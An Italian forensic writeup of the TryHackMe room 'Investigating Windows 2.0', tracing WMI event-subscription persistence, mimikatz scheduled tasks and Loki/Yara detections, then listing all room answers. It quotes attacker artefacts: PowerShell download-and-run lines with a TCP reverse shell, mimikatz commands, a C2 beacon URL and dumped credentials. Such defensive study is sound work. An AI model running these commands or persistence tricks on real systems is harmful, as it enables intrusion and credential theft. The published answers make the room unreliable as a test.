---
layout: writeup
lang: it
permalink: /writeups/investigating-windows-2/
title: "Investigating Windows 2.0"
ref: investigating-windows-2
date: 2026-09-01
bare: true
platform: THM
os: Windows Server 2016 Datacenter
difficulty: Medium
series: thm-windows
tags: [win, dfir, wmi, loki, yara, procmon, sysinternals]
txt: /writeups-files/investigating-windows-2.txt
summary: "Trenta domande su una macchina compromessa. L'attaccante ha lasciato una backdoor WMI che chiama casa ogni ora e che chiude Process Explorer appena provi ad aprirlo."
---

# Writeup — Investigating Windows 2.0 (TryHackMe)

OS: Windows Server 2016 Datacenter (build 14393)
Difficoltà: Medium
Data: 13 settembre 2026

---

## Sommario

seconda room della serie, stessa macchina della prima ma stavolta le domande sono trenta e scavano molto più a fondo. sempre nessuna exploitation: RDP con Administrator / letmein123! e si analizza. la differenza rispetto alla 1 è che qui non basta più leggere output nativi, servono i Sysinternals e soprattutto Loki, lo scanner IOC basato su regole Yara, e nell'ultima domanda tocca scrivere tu le stringhe di una regola Yara per beccare il binario che Loki non rileva.

la macchina è lo stesso EC2AMAZ-I8UHO76 già visto. quello che emerge in più rispetto alla prima room è l'impianto di persistenza WMI: due ActiveScriptEventConsumer registrati nel repository, uno che fa beaconing verso un C2 esterno ogni ora, l'altro che uccide Process Explorer nell'istante in cui provi ad aprirlo. quest'ultimo è la cosa più elegante di tutta la room, perché ti sabota lo strumento con cui staresti indagando

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco, spiegazione dettagliata di concetti tecnici e correzione di sintassi in comandi lunghi. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

per la sintassi delle query WMI da riga di comando e per il funzionamento delle event subscription ho fatto riferimento alla documentazione Microsoft:
https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

alcuni hash nell'output di Loki sono stati mascherati con asterischi in fase di pubblicazione.

---

## Premessa

Kali virtualizzata su Linux Mint, VPN TryHackMe attiva e verificata con ip a show tun0 (192.168.134.214/18).

a differenza della room precedente stavolta l'RDP dalla mia Kali ha funzionato, ma la macchina si è rivelata instabile in un modo che ha condizionato tutta la sessione: ogni volta che il carico saliva un minimo, la sessione RDP cadeva. e il carico saliva praticamente sempre, perché questa room ti chiede di usare Procmon e Loki, che sono esattamente le due cose più pesanti che puoi lanciare su una VM da 2 GB.

xfreerdp /v:10.114.179.164 /u:Administrator /p:'letmein123!' /clipboard /dynamic-resolution /cert:ignore
[ERROR][com.freerdp.core] - [get_next_addrinfo]: ERRCONNECT_CONNECT_FAILED [0x00020006]
[ERROR][com.freerdp.core.transport] - ConnectLayer 10.114.179.164:3389 [15000ms] failed

questo errore all'inizio mi ha fatto pensare alla VPN, ma nc -zvw3 10.114.179.164 3389 rispondeva open a intermittenza: la macchina stava ancora finendo di bootare e il servizio RDP non era su. la soluzione è stata un loop che ritenta finché non aggancia, invece di stare lì a rilanciare a mano:

until xfreerdp /v:10.114.179.164 /u:Administrator /p:'letmein123!' /clipboard /cert:ignore /bpp:8 -themes -wallpaper -aero /timeout:60000 2>/dev/null; do sleep 10; done

il /bpp:8 e la disattivazione di temi e wallpaper li ho aggiunti dopo i primi kick, per alleggerire il più possibile la sessione

l'altro problema ricorrente è stato il clipboard: rdpclip.exe sul target si pianta di continuo e il copia incolla smette di funzionare senza avviso. si risolve senza riconnettersi:

taskkill /f /im rdpclip.exe & start rdpclip

l'ho dovuto rilanciare almeno otto volte nel corso della sessione. lo scrivo perché è il tipo di dettaglio che nessun writeup riporta mai e che invece ti fa perdere venti minuti se non sai cos'è.

---

## Fase 1 — La chiave di registro gemella della scheduled task

la prima domanda chiede quale chiave di registro contiene lo stesso comando eseguito da una scheduled task. dalla room precedente sapevo già che le task malevole erano GameOver, falshupdate22, Clean file system, check logged in e update windows, e che GameOver eseguiva mimikatz.

ho ripreso i comandi di tutte in un colpo solo, invece di aprirle una per una:

for %t in ("GameOver" "falshupdate22" "Clean file system" "check logged in" "update windows" "BADR" "BadrClient") do @schtasks /query /tn %t /fo list /v &#124; findstr /i /c:"Task To Run"

Task To Run:                          C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt
Task To Run:                          powershell.exe -WindowStyle Hidden -nop -c ""
Task To Run:                          C:\TMP\nc.ps1 -l 1348
Task To Run:                          "C:\Program Files (x86)\Internet Explorer\iexplore.exe"
Task To Run:                          "C:\Program Files (x86)\Internet Explorer\ieinstal.exe"
Task To Run:                          powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\badr\badr-ng.ps1
Task To Run:                          C:\badr\badr.exe -config C:\badr\config.yaml &#46;&#46;&#46;

BADR e BadrClient le ho scartate subito: la lab machine si chiama letteralmente "YaraChallenge -badr", quindi è infrastruttura della room, non dell'attacco. falshupdate22 esegue un comando powershell vuoto, è un red herring puro e l'ho confermato guardando l'XML:

schtasks /query /tn "falshupdate22" /xml &#124; findstr /i "Arguments Command"
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -nop -c ""</Arguments>

quello che conta è GameOver, che lancia mimikatz con sekurlsa::LogonPasswords. la stessa stringa va cercata nel registro. le chiavi Run le avevo già controllate nella room 1 e lì non c'era,quindi ho puntato su HKCU\Environment, che è dove sta UserInitMprLogonScript, un meccanismo di persistenza vecchio e poco battuto (esegue uno script a ogni logon dell'utente):

reg query "HKCU\Environment"

HKEY_CURRENT_USER\Environment
    Path    REG_EXPAND_SZ    %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
    TEMP    REG_EXPAND_SZ    %USERPROFILE%\AppData\Local\Temp
    TMP     REG_EXPAND_SZ    %USERPROFILE%\AppData\Local\Temp
    UserInitMprLogonScript    REG_MULTI_SZ    C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt

esattamente lo stesso comando della task GameOver. quindi mimikatz gira sia a intervalli regolari via scheduler sia a ogni logon.

nota: l'hint della room scrive "UserIntMprLogonScript", con un typo (manca la i di Init). la risposta accettata è UserInitMprLogonScript, e per un po' ho pensato di aver sbagliato chiave perché copiavo l'hint.

---

## Fase 2 — Lo strumento che si chiude da solo

la domanda successiva chiede quale tool di analisi si chiude immediatamente quando provi a lanciarlo. nella cartella Tools sul desktop c'è la SysinternalsSuite completa, e il primo tool che uno apre per guardare i processi è Process Explorer:

C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\procexp64.exe

la finestra compare per una frazione di secondo e sparisce. non è un crash, è qualcosa che lo termina. la room vuole il nome dell'eseguibile, procexp64.exe, e non quello del tool, e la spiegazione del perché muoia arriva dalla fase dopo.

---

## Fase 3 — L'impianto WMI

Loki ha un plugin WMI che enumera le event subscription registrate, ed è lì che si vede tutto. ma lo stesso risultato si ottiene anche con wmic nativo, che è più veloce e non carica la macchina:

wmic /namespace:\\root\subscription path __FilterToConsumerBinding get Consumer,Filter

Consumer                                                  Filter
ActiveScriptEventConsumer.Name="LaunchBeaconingBackdoor"  __EventFilter.Name="TimingIntervalTrigger"
NTEventLogEventConsumer.Name="SCM Event Log Consumer"     __EventFilter.Name="SCM Event Log Filter"
ActiveScriptEventConsumer.Name="KillProcess"              __EventFilter.Name="ProcessStartTrigger"

tre binding. quello di mezzo, SCM Event Log Consumer, è legittimo e presente su ogni Windows, lo scarto. gli altri due sono l'attacco.

KillProcess è agganciato a ProcessStartTrigger, e la sua query WQL è questa:

SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'

ecco perché Process Explorer muore. c'è un consumer VBScript che si attiva sull'evento di avvio di quel preciso processo e chiama Terminate() sul PID appena nato. è la risposta a due domande insieme: il tool è Process Explorer e la WQL è quella.

il linguaggio dei consumer si legge direttamente:

wmic /namespace:\\root\subscription path ActiveScriptEventConsumer get Name,ScriptingEngine

Name                       ScriptingEngine
LaunchBeaconingBackdoor    VBScript
KillProcess                VBScript

VBScript, e l'altro script è LaunchBeaconingBackdoor.

quest'ultimo è il pezzo grosso. il suo ScriptText contiene, in chiaro, tutta la logica di beaconing: legge il MachineGuid dal registro, lo appende all'URL del C2, fa una GET, e a seconda dell'header Type della risposta esegue codice VBScript, salva un payload dentro il repository WMI, cancella una classe o lancia un comando via Win32_Process. il C2 è

http://googleaccountsservices.com/index.html&ID= + MachineGuid

e l'intervallo del timer si legge dal repository:

wmic /namespace:\\root\cimv2 path __IntervalTimerInstruction get TimerId,IntervalBetweenEvents

IntervalBetweenEvents  TimerId
3600000                Timer

3600000 millisecondi, cioè un beacon ogni ora. da qui esce anche la WQL dell'altro filtro, SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'.

dentro il codice del decoder base64 incluso nello script ci sono i commenti dell'autore originale, che l'attaccante non ha ripulito:

' 1999 - 2004 Antonin Foller, http://www.motobit.com
'1999 Antonin Foller, Motobit Software, http://Motobit.cz

la società è Motobit Software e i due siti sono http://www.motobit.com e http://motobit.cz. è codice copiato da una libreria pubblica di conversione base64, riusato dentro un backdoor. la room lo sfrutta per la domanda successiva: cercando online il nome del consumer insieme al dominio di Motobit si arriva a WMIBackdoor.ps1, uno script di attacco pubblico per registrare persistenza WMI, che è esattamente lo stesso file che sta sulla macchina:

dir /s /b C:\WMIBackdoor.ps1
C:\TMP\WMIBackdoor.ps1

e infatti la struttura dello script combacia con quello che vediamo registrato:

findstr /i "TimerID Interval" C:\TMP\WMIBackdoor.ps1
        [Parameter(Mandatory = $True, ParameterSetName = 'Interval')]
        $TimingInterval,
            $IntervalMS = $TimingInterval * 60000
                Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$TimerName'"

il $TimingInterval * 60000 conferma che il valore 3600000 corrisponde a 60 minuti passati come parametro.

---

## Fase 4 — Procmon senza GUI

le domande dalla 10 alla 14 vogliono Process Monitor: quali due processi si aprono e si chiudono di continuo, chi è il padre, qual è la prima operazione, cosa mostra la tab Event, e quale processo anomalo compare nelle operazioni su disco.

il problema è che Procmon in GUI su questa macchina significa kick garantito entro un minuto. la prima volta mi ha buttato fuori mentre stavo ancora aprendo il menu Filter.

la soluzione è che Procmon ha una modalità headless. si lancia con /Quiet /Minimized e scrive su un backing file, e se lo si avvia con start /b sopravvive alla disconnessione RDP:

start "" /b C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\Procmon64.exe /AcceptEula /Quiet /Minimized /BackingFile C:\cap.pml /Runtime 300

cinque minuti di cattura che girano da soli. mi ha kickato a metà, ma il file continua a riempirsi lato macchina e al rientro era tutto lì.

poi la conversione in CSV, che è l'unico passaggio che richiede la GUI ma non richiede interazione:

C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\Procmon64.exe /OpenLog C:\cap.pml /SaveAs C:\cap.csv

dir C:\cap.csv
09/13/2026  03:44 PM       355,249,050 cap.csv

355 MB. a quel punto findstr e PowerShell fanno il resto senza toccare interfacce grafiche. un dettaglio che mi è costato caro: il mio primo tentativo era

findstr /i "Process Start" C:\cap.csv

che non funziona, perché findstr con più parole tra virgolette le cerca in OR e ti restituisce mezzo file. su 355 MB significa output infinito. la forma giusta usa il match come stringa unica:

powershell -c "sls 'Process Start' C:\cap.csv &#124; %{($_ -split ',')[1]} &#124; sort -u"

"atbroker.exe"
"Conhost.exe"
"csrss.exe"
"DllHost.exe"
"dwm.exe"
"LogonUI.exe"
"lpremove.exe"
"powershell.exe"
"rdpclip.exe"
"smss.exe"
"svchost.exe"
"taskhostw.exe"
"TSTheme.exe"
"winlogon.exe"
"wmic.exe"
"wmiprvse.exe"

qui c'è una trappola che ho preso in pieno. in questa lista compare wmic.exe con quattro avvii ravvicinati, e sul momento avevo dato per buono che i due processi ricorrenti fossero powershell.exe e wmic.exe. sbagliato: quei wmic ero io, erano le mie stesse query WMI della fase 3 finite nella cattura. filtrando i tempi si vede benissimo:

powershell -c "sls 'Process Start' C:\cap.csv &#124; ?{$_ -match 'wmic&#124;powershell'} &#124; %{($_ -split ',')[0]+' '+($_ -split ',')[1]}"

C:\cap.csv:828364:"3:39:04.2790376 PM" "powershell.exe"
C:\cap.csv:1954386:"3:41:04.2820239 PM" "powershell.exe"
C:\cap.csv:2043585:"3:41:55.6312910 PM" "wmic.exe"
C:\cap.csv:2047881:"3:41:55.9340251 PM" "wmic.exe"
C:\cap.csv:2050971:"3:41:56.0879098 PM" "wmic.exe"
C:\cap.csv:2054659:"3:41:56.2772642 PM" "wmic.exe"

i quattro wmic sono tutti dentro lo stesso secondo, le 3:41:55-56, cioè un burst singolo: è attività mia, non un pattern periodico. powershell.exe invece compare alle 3:39:04 e alle 3:41:04, esattamente due minuti dopo, e quello sì è periodico. il secondo processo ricorrente è mim.exe, che in questa cattura non compare perché avevo riavviato la macchina e il primo giro della task GameOver non era ancora scattato nella finestra dei cinque minuti. rifacendo la cattura più lunga si vedono entrambi.

quindi i due processi sono mim.exe e powershell.exe.

la riga completa del primo Process Start dà tre risposte insieme:

powershell -c "sls 'Process Start' C:\cap.csv &#124; ?{$_ -match 'powershell'} &#124; select -f 1 -exp Line"

"3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, Command line: powershell.exe -WindowStyle Hidden -nop -c """", Current directory: C:\Windows\system32\, Environment:

Parent PID 916, e i quattro campi della tab Event sono Parent PID, Command line, Current directory, Environment. il nome del padre:

wmic process where "ProcessId=916" get Name,ExecutablePath

ExecutablePath                   Name
C:\Windows\system32\svchost.exe  svchost.exe

svchost.exe, che è coerente: le scheduled task vengono lanciate dal Task Scheduler, che gira dentro un svchost.

la prima operazione in assoluto del processo è Process Start, verificabile prendendo le prime righe di quel PID:

powershell -c "sls '\"4288\"' C:\cap.csv &#124; select -f 3 -exp Line"

"3:39:04.2790376 PM","powershell.exe","4288","Process Start","","SUCCESS","Parent PID: 916, &#46;&#46;&#46;
"3:39:04.2791009 PM","powershell.exe","4288","Thread Create","","SUCCESS","Thread ID: 4580"
"3:39:04.2831665 PM","powershell.exe","4288","Load Image","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","SUCCESS","Image Base: &#46;&#46;&#46;

Process Start, poi Thread Create, poi Load Image. sequenza canonica di avvio.

per le operazioni su disco, guardando la colonna Process Name delle scritture compare una voce che non è un processo: "No Process". sono operazioni disco senza un processo attribuibile, tipicamente attività a livello kernel o di un processo già terminato quando l'evento viene registrato. su una macchina compromessa è esattamente il tipo di anomalia che si cerca, ed è la risposta alla domanda sul processo anomalo nelle disk operations.

per il conteggio delle scritture per processo, che serve a orientarsi:

powershell -c "sls -s 'WriteFile' C:\cap.csv &#124; %{($_ -split ',')[1]} &#124; sort -u"

"amazon-ssm-agent.exe"
"badr.exe"
"Explorer.EXE"
"lsass.exe"
"MpCmdRun.exe"
"MsMpEng.exe"
"powershell.exe"
"svchost.exe"
"System"
"taskhostw.exe"
"TiWorker.exe"
"TrustedInstaller.exe"

il -s (SimpleMatch) è quello che rende la ricerca praticabile su un file di quella dimensione, senza di quello la regex ci mette minuti.

---

## Fase 5 — Loki

qui c'è la parte più corposa, quattordici domande su un solo output. Loki sta in Tools sul desktop, ma non nella cartella che sembra:

dir /s /b C:\Users\Administrator\Desktop\Tools\loki_0.33.0\*.exe
C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki-upgrader.exe
C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe

c'è un secondo livello di cartella "loki" dentro "loki_0.33.0" e il primo lancio mi è fallito per quello.

la prima scansione l'ho fatta solo su C:\TMP per andare veloce:

C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\TMP &#45;&#45;noprocscan &#45;&#45;dontwait -l C:\loki.log

e questa è stata una scelta sbagliata che mi è costata un giro completo. le domande dalla 24 alla 28 riguardano un binario che sta in C:\Users\Public, quindi fuori da C:\TMP, e con quello scope non compaiono. la scansione va fatta su tutto il disco:

C:\Users\Administrator\Desktop\Tools\loki_0.33.0\loki\loki.exe -p C:\ &#45;&#45;noprocscan -l C:\loki.log

il &#45;&#45;noprocscan salta la scansione dei processi in memoria, che su questa VM è la parte che la fa morire. anche così ci mette parecchio e il consiglio della room di lasciarlo girare finché non vedi i warning su ntds.dit è corretto.

su questo passaggio ho dovuto riavviare la macchina un paio di volte: loki.log non si apriva subito e la VM esauriva RAM a metà scansione. la domanda 29 in particolare è quella che mi ha fatto perdere più tempo di tutte, perché per rispondere "quale binario non compare" devi avere la certezza che la scansione sia arrivata in fondo, altrimenti stai solo guardando un log troncato.

l'output, partendo dall'inizio:

[NOTICE] Starting Loki Scan VERSION: 0.33.0 SYSTEM: EC2AMAZ-I8UHO76
[NOTICE] Registered plugin PluginWMI
[NOTICE] PE-Sieve successfully initialized
[INFO] File Name Characteristics initialized with 2973 regex patterns
[INFO] C2 server indicators initialized with 1548 elements
[INFO] Malicious MD5 Hashes initialized with 19034 hashes
&#46;&#46;&#46;
[INFO] Initialized 682 Yara rules

il modulo dopo Init è WMI Scan, cioè il plugin WMI che Loki registra e poi esegue per primo. è il PluginWMI che vediamo caricato in cima.

i warning arrivano subito dopo,in ordine:

[WARNING] CLASS: __eventFilter
MD5: ******** NAME: TimingIntervalTrigger QUERY: SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'
[WARNING] CLASS: __eventFilter
MD5: ******** NAME: ProcessStartTrigger QUERY: SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'
[WARNING] CLASS: __FilterToConsumerBinding
MD5: ******** CONSUMER: ActiveScriptEventConsumer.Name="LaunchBeaconingBackdoor" FILTER: __EventFilter.Name="TimingIntervalTrigger"
[WARNING] CLASS: __FilterToConsumerBinding
MD5: ******** CONSUMER: ActiveScriptEventConsumer.Name="KillProcess" FILTER: __EventFilter.Name="ProcessStartTrigger"

il secondo warning ha eventFilter ProcessStartTrigger, il quarto ha come classe __FilterToConsumerBinding. le domande chiedono esattamente questi due, e vanno contati i warning nell'ordine in cui escono, non i binding.

poi gli alert sui file:

[ALERT]
FILE: C:\TMP\nbtscan.exe SCORE: 160 TYPE: EXE SIZE: 36864
FIRST_BYTES: 4d5a90000300000004000000ffff0000b8000000 / MZ
MD5: ******** SHA256: ********
REASON_1: File Name IOC matched PATTERN: \\nbtscan\.exe SUBSCORE: 60 DESC: Known Bad / Dual use classics
REASON_2: Malware Hash TYPE: SHA256 SUBSCORE: 100 DESC: Emissary Panda Tools and Malware

i FIRST_BYTES 4d5a9000&#46;&#46;&#46; sono l'header MZ di un PE, quindi in teoria valgono per qualsiasi eseguibile, ma la domanda si riferisce a questo alert specifico: nbtscan.exe. la description di reason 1 è Known Bad / Dual use classics, cioè un tool a doppio uso noto, legittimo di suo ma classico nell'arsenale offensivo.

[ALERT]
FILE: C:\TMP\p.exe SCORE: 105 TYPE: EXE SIZE: 381816
MD5: ******** SHA256: ********
REASON_1: File Name IOC matched PATTERN: \\[a-zA-Z]\.exe$ SUBSCORE: 45 DESC: Typical Malware Name
REASON_2: Yara Rule MATCH: APT_Cloaked_PsExec SUBSCORE: 60
DESCRIPTION: Looks like a cloaked PsExec. May be APT group activity.
MATCHES: Str1: psexesvc.exe Str2: Sysinternals PsExec

p.exe è quello marcato APT Cloaked, e le due stringhe che hanno fatto scattare la regola sono psexesvc.exe e Sysinternals PsExec. da notare anche il reason 1: il pattern \\[a-zA-Z]\.exe$ becca i file con nome di una sola lettera, che è una convenzione tipica di chi droppa tool rinominati per essere corti da digitare.

[WARNING]
FILE: C:\TMP\schtasks-backdoor.ps1 SCORE: 60 TYPE: UNKNOWN SIZE: 7022
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: PowerShell_Susp_Parameter_Combo
DESCRIPTION: Detects PowerShell invocation with suspicious parameters
MATCHES: Str1:  -enc  Str2:  -nop  Str3:  -ep bypass  Str4:  -exec bypass

[INFO] Scanning memory dump file somethingwindows.dmp

l'alert associato a somethingwindows.dmp è schtasks-backdoor.ps1: Loki processa il dump e il match risultante viene attribuito a quello script, che è anche il file immediatamente adiacente nell'output. lo script l'ho poi aperto per capire cosa contenesse:

type C:\TMP\schtasks-backdoor.ps1 &#124; findstr /i "enc bypass http"

C:\Users\test\Desktop>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 8.8.8.8 -port 9999 -time 2"
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 8.8.8.8 -port 8081 -time 2"
        ps = 'powershell.exe -ep bypass -enc ';
`$client = New-Object System.Net.Sockets.TCPClient("$Ip",$Port);`$stream = `$client.GetStream();&#46;&#46;&#46;

è un generatore di scheduled task backdoor: scarica se stesso da un server, e a seconda del metodo crea una reverse shell TCP pura oppure un payload msf, con intervallo di due minuti. l'8.8.8.8 è ovviamente un placeholder della documentazione dello strumento, non il vero C2, e i due minuti sono esattamente l'intervallo che avevo visto in Procmon fra un powershell.exe e l'altro. i due pezzi combaciano.

[WARNING]
FILE: C:\TMP\xCmd.exe SCORE: 60 TYPE: EXE SIZE: 843776
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: XOR_4byte_Key
DESCRIPTION: Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)

xCmd.exe è il binario cifrato simile a un trojan. XOR a 4 byte è una tecnica di offuscamento banale ma sufficiente contro le firme statiche, e la regola la associa a Derusbi.

[WARNING]
FILE: C:\TMP\mim-out.txt SCORE: 80
FIRST_BYTES: 0d0a20202e23232323232e2020206d696d696b61 /   .#####.   mimika
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: Mimikatz_Logfile
DESCRIPTION: Detects a log file generated by malicious hack tool mimikatz
MATCHES: Str1: SID               : Str2: * NTLM     : Str3: Authentication Id : Str4: wdigest :

i FIRST_BYTES qui sono la banner ASCII di mimikatz in chiaro. il file di output è rilevato, l'eseguibile che l'ha prodotto no, e su questo torna la domanda 29.

la parte che con la scansione limitata a C:\TMP non avevo visto:

FILE: C:\Users\Public\svchost.exe SCORE: **** TYPE: EXE
MD5: ******** SHA256: ********
REASON_1: &#46;&#46;&#46; DESC: Stuff running where it normally shouldn't

svchost.exe è uno dei processi core di Windows e vive esclusivamente in C:\Windows\System32. una copia in C:\Users\Public è masquerading puro: il nome è talmente familiare che in un elenco processi non lo guardi nemmeno. la description di reason 1 è Stuff running where it normally shouldn't, che è la categoria di Loki per i binari fuori posto, e il percorso legittimo è C:\Windows\System32.

nella stessa cartella:

FILE: C:\Users\Public\en-US.js SCORE: **** TYPE: UNKNOWN
MD5: ******** SHA256: ********
REASON_1: Yara Rule MATCH: CACTUSTORCH

en-US.js, mascherato da file di localizzazione. CACTUSTORCH è un framework noto per l'esecuzione di shellcode via JScript/VBScript sfruttando il .NET framework, ed è coerente con tutto il resto dell'impianto, che è interamente basato su scripting engine nativi invece che su binari compilati.

infine la domanda 29, quale binario non compare nei risultati:

findstr /i "mim.exe" C:\loki.log

nessun output. mim.exe non c'è. e non è un caso: è il file più importante di tutta la macchina, viene eseguito da una scheduled task e da una chiave di logon, ma nessuna delle 682 regole Yara caricate lo intercetta. il suo output di testo sì, lui no

---

## Fase 6 — Scrivere la regola Yara

l'ultima domanda è l'unica in cui produci qualcosa invece di leggerlo. nella cartella yara-v4.0.4 sul desktop c'è una regola incompleta:

type C:\Users\Administrator\Desktop\Tools\yara-v4.0.4-1544-win64\test.yar

rule mimikatz
{
        strings:
                $s1 = "??.??1"
                $s2 = "??.?x?"
                $s3 = "v?.?.????7"
        condition:
                all of them
}

sono tre pattern con ? come carattere jolly, e la condizione è all of them, quindi servono tre stringhe reali dentro mim.exe che corrispondano a quelle maschere. il modo per trovarle è strings dei Sysinternals con findstr in modalità regex, traducendo ogni ? in un punto:

C:\Users\Administrator\Desktop\Tools\SysinternalsSuite\strings64.exe -accepteula C:\TMP\mim.exe &#124; findstr /r "..\&#46;&#46;&#46;1 ..\..x. v..\&#46;&#46;&#46;\&#46;&#46;&#46;..7"

PowerShell.ExecutionPolicy
Service.exe.manifest
PowerShell.ExecutionPolicy
3.8.0.129
mk.ps1
mk.ps1
mk.ps1
mk.exe
mk.exe
mk.exe

le prime due escono subito: mk.ps1 corrisponde a ??.??1 e mk.exe corrisponde a ??.?x?. la terza no, perché la maschera v?.?.????7 ha una struttura diversa e il mio primo tentativo di regex era sbagliato:

strings64.exe C:\TMP\mim.exe &#124; findstr /r "^v.\&#46;&#46;&#46;\&#46;&#46;&#46;.7"
(nessun output)

l'errore era ancorare con ^ e sbagliare il conteggio dei caratteri fra i punti. v?.?.????7 significa: v, un carattere, punto, un carattere, punto, quattro caratteri, 7. senza ancora e con i gruppi giusti:

strings64.exe C:\TMP\mim.exe &#124; findstr /r "v.\..\&#46;&#46;&#46;..7"

<supportedRuntime version="v2.0.50727" />
v2.0.50727
<supportedRuntime version="v2.0.50727" />
v2.0.50727

v2.0.50727, che è il numero di build del .NET Framework 2.0. quindi le tre stringhe sono mk.ps1, mk.exe, v2.0.50727.

il ragionamento dietro la regola vale più della risposta: mk.ps1 e mk.exe sono i nomi originali degli artefatti di mimikatz prima della rinomina, rimasti dentro il binario come stringhe residue. l'attaccante ha rinominato il file sul disco ma non ha toccato il contenuto, e la detection funziona proprio su quello. il riferimento a .NET 2.0 aggiunge specificità e riduce i falsi positivi.

---

## Fase 7 — Il resto del quadro

alcune cose le ho verificate anche se non erano domande, perché servivano a chiudere la timeline.

le credenziali effettivamente rubate:

type C:\TMP\mim-out.txt &#124; findstr /i "Username Password NTLM"

mimikatz(powershell) # sekurlsa::logonpasswords
         * Username : Ion
         * NTLM     : ********
         * Username : Ion
         * Password : MySecretP4ass
         * Username : Administrator
         * Username : ION-PC$
         * Password : (null)

l'utente compromesso è Ion su un host ION-PC, con password in chiaro recuperata da wdigest. questo host non è la macchina che sto analizzando, quindi il dump è stato portato qui da un altro sistema, come già succedeva col pwdump sul desktop nella room 1.

il file hosts, ancora avvelenato:

type C:\Windows\System32\drivers\etc\hosts

10.2.2.2        update.microsoft.com
127.0.0.1  www.virustotal.com
127.0.0.1  www.www.com
127.0.0.1  dci.sophosupd.com
76.32.97.132 google.com
76.32.97.132 www.google.com

e le chiavi Run:

reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

UpdateSvc    REG_SZ    C:\TMP\p.exe -s \\10.34.2.3 'net user' > C:\TMP\o2.txt
BadrClient   REG_SZ    wscript.exe "C:\badr\start-badr.vbs" //B //Nologo

le regole firewall custom stavolta non c'erano più:

netsh advfirewall firewall show rule name=all &#124; findstr /i "1348"
(nessun output)

le 1337 e 8888 della room precedente non risultano su questa istanza. può essere una differenza fra gli snapshot delle due room oppure un reset, in ogni caso l'ho annotato come artefatto assente e non l'ho usato per la timeline.

---

## Catena completa

timeline ricostruita, orari UTC del 2 marzo 2019 dove disponibili.

16:04:49  accesso iniziale e assegnazione di privilegi elevati (dalla room 1, ingresso via webshell .jsp in C:\inetpub\wwwroot)
16:37     drop del toolkit in C:\TMP: mim.exe, p.exe, xCmd.exe, nc.ps1, nbtscan.exe, WMIBackdoor.ps1
16:37     esecuzione di mimikatz, credenziali dell'utente Ion (host ION-PC) scritte in mim-out.txt
16:45     dump di memoria somethingwindows.dmp, generazione di schtasks-backdoor.ps1
16:46     ricognizione NetBIOS con nbtscan, scan1/2/3.tmp restituiscono zero byte
16:47     registrazione delle scheduled task malevole
&#45;&#45;        drop di C:\Users\Public\svchost.exe (masquerading su processo core) e di en-US.js (loader CACTUSTORCH)
&#45;&#45;        registrazione delle due WMI event subscription tramite WMIBackdoor.ps1:
             TimingIntervalTrigger -> LaunchBeaconingBackdoor, beacon VBScript ogni 3600000 ms
             verso http://googleaccountsservices.com/index.html&ID=<MachineGuid>
             ProcessStartTrigger -> KillProcess, termina procexp64.exe all'avvio
&#45;&#45;        HKCU\Environment\UserInitMprLogonScript impostata su mim.exe, mimikatz a ogni logon
&#45;&#45;        task GameOver: mim.exe sekurlsa::LogonPasswords, stesso comando della chiave
&#45;&#45;        task Clean file system: nc.ps1 -l 1348, bind shell giornaliera
&#45;&#45;        task falshupdate22: powershell vuoto, esca
&#45;&#45;        chiavi Run: p.exe verso 10.34.2.3 (movimento laterale interno), start-badr.vbs silenzioso
&#45;&#45;        hosts avvelenato: update.microsoft.com, virustotal e sophosupd neutralizzati, google.com su 76.32.97.132

la logica dell'impianto è ridondanza su piani diversi. la persistenza sta contemporaneamente nel Task Scheduler, nel registro utente, nelle chiavi Run e nel repository WMI, che sono quattro posti che si controllano con quattro strumenti diversi. il beaconing usa VBScript dentro WMI, che non lascia file sul disco. e il consumer KillProcess è difesa attiva: non nasconde le tracce, impedisce proprio che tu apra lo strumento con cui le vedresti.

---

## Risposte della room

1.  UserInitMprLogonScript
2.  Process Explorer
3.  SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'procexp64.exe'
4.  VBScript
5.  LaunchBeaconingBackdoor
6.  Motobit Software
7.  http://www.motobit.com, http://motobit.cz
8.  WMIBackdoor.ps1
9.  C:\TMP
10. mim.exe, powershell.exe
11. svchost.exe
12. Process Start
13. Parent PID, Command line, Current directory, Environment
14. No Process
15. WMI Scan
16. ProcessStartTrigger
17. __FilterToConsumerBinding
18. nbtscan.exe
19. Known Bad / Dual use classics
20. p.exe
21. psexesvc.exe, Sysinternals PsExec
22. schtasks-backdoor.ps1
23. xCmd.exe
24. C:\Users\Public\svchost.exe
25. C:\Windows\System32
26. Stuff running where it normally shouldn't
27. en-US.js
28. CACTUSTORCH
29. mim.exe
